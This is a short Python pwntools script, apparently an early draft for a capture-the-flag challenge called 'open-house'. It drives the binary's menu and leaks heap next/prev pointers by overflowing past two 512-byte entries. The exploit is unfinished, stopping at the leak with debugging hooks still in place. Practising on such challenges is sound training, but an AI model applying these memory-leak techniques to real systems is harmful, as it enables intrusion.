#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./open-house')
e=ELF("./open-house")
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

def add(payload):
    sla("> ", "c")
    sla("!\n", payload)

def view():
    sla("> ", "v")

def edit(idx, content):
    sla("> ", "m")
    sla("?\n", idx)
    sla("?\n", content)
    
def remove(idx):
    sla("> ", "d")
    sla("?\n",idx)

def quit():
    sla("> ", "q")


add("A"*512)
add("B"*512)
gdb.attach(p)
view()
ru("A"*512)
nxt=hex(u32(r(4).ljust(4, b"\x00")))
prv=hex(u32(r(4).ljust(4, b"\x00")))
info(str(nxt))
info(str(prv))
# remove()

p.interactive()
